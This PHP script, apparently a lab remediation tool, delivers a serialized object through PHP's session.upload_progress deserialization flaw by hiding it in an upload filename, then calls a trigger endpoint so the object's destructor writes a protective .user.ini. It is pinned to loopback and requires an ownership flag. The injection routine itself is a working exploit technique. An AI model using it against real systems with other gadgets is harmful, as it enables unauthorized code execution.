<?php
// Benevolent demonstration driver. LAB ONLY, loopback only.
//
// Delivers a zero-property UploadProgressContainment object through the
// session.upload_progress deserialization path, then reads the trigger
// endpoint so its destructor writes the containment .user.ini. The payload
// carries no path and no command: the only possible effect on the target is
// the one protective configuration line.
//
// Usage:
//   php fire-benevolent.php --i-own-this-system <upload-path> <trigger-path> [sid]
//
// The flag is required: it is your explicit statement that the target is your
// own system. The target host is hard-pinned to 127.0.0.1; there is no option
// to point this at another host, by design.

$ack  = in_array('--i-own-this-system', $argv, true);
$rest = array_values(array_filter($argv, static fn($a) => $a !== '--i-own-this-system'));

$uploadPath  = $rest[1] ?? '/upload/benevolent-upload.php';
$triggerPath = $rest[2] ?? '/trigger/benevolent-trigger.php';
$sid         = $rest[3] ?? 'benevolent-demo-0001';

if (!$ack) {
    fwrite(STDERR, "refusing to run.\n");
    fwrite(STDERR, "pass --i-own-this-system to confirm the target is your own lab system.\n");
    fwrite(STDERR, "benevolent intent is not a legal defense; never run this against a system you do not own.\n");
    exit(2);
}

$host = '127.0.0.1'; // hard-pinned on purpose; not configurable.

// A zero-property object: the gadget needs no fields. The trigger endpoint
// fixes where containment is written, so the payload cannot steer it.
$class   = 'UploadProgressContainment';
$object  = sprintf('O:%d:"%s":0:{}', strlen($class), $class);
// The `php` session handler splits the stored value at the first `|` and
// deserializes the right-hand side. upload_progress stores our value under a
// key built from the uploaded file's name, so the `|` must sit in the filename.
$payload = 'x|' . $object;

echo "target:   {$host} (loopback, fixed)\n";
echo "sid:      {$sid}\n";
echo "gadget:   {$object}\n\n";

function raw_request(string $host, string $req): string
{
    $fp = @fsockopen($host, 80, $errno, $errstr, 15);
    if (!$fp) {
        return "CONNECT FAILED: {$errno} {$errstr}";
    }
    stream_set_timeout($fp, 15);
    fwrite($fp, $req);
    $resp = '';
    while (!feof($fp)) {
        $chunk = fread($fp, 8192);
        if ($chunk === false || $chunk === '') {
            break;
        }
        $resp .= $chunk;
    }
    fclose($fp);
    return $resp;
}

// Step 1: plant the payload via one PHP_SESSION_UPLOAD_PROGRESS multipart POST.
$boundary = 'BENEVOLENT';
$body = "--{$boundary}\r\n"
      . "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n{$sid}\r\n"
      . "--{$boundary}\r\n"
      . "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\nx\r\n"
      . "--{$boundary}\r\n"
      // The quotes inside the object must be backslash-escaped or the first one
      // would terminate the filename value in the Content-Disposition header.
      . "Content-Disposition: form-data; name=\"f\"; filename=\"" . str_replace('"', '\\"', $payload) . "\"\r\n"
      . "Content-Type: application/octet-stream\r\n\r\nZ\r\n"
      . "--{$boundary}--\r\n";

echo "=== step 1: plant payload via upload_progress ({$uploadPath}) ===\n";
$r = raw_request(
    $host,
    "POST {$uploadPath} HTTP/1.1\r\nHost: {$host}\r\n"
    . "Content-Type: multipart/form-data; boundary={$boundary}\r\n"
    . 'Content-Length: ' . strlen($body) . "\r\n"
    . "Cookie: PHPSESSID={$sid}\r\nConnection: close\r\n\r\n"
    . $body
);
echo '  ', strtok($r, "\r\n"), "\n\n";

// Step 2: read the trigger endpoint so the containment destructor runs.
echo "=== step 2: trigger remediation ({$triggerPath}) ===\n";
$r = raw_request(
    $host,
    "GET {$triggerPath} HTTP/1.1\r\nHost: {$host}\r\n"
    . "Cookie: PHPSESSID={$sid}\r\nConnection: close\r\n\r\n"
);
echo '  ', strtok($r, "\r\n"), "\n";
$bodyOut = explode("\r\n\r\n", $r, 2)[1] ?? '';
echo trim($bodyOut), "\n\n";
echo "If the destructor ran, the trigger directory now holds a .user.ini with\n";
echo "session.upload_progress.enabled=0 — the feature is disabled and the flaw\n";
echo "is no longer reachable there. Re-run the php2shell-remediate probe to confirm.\n";
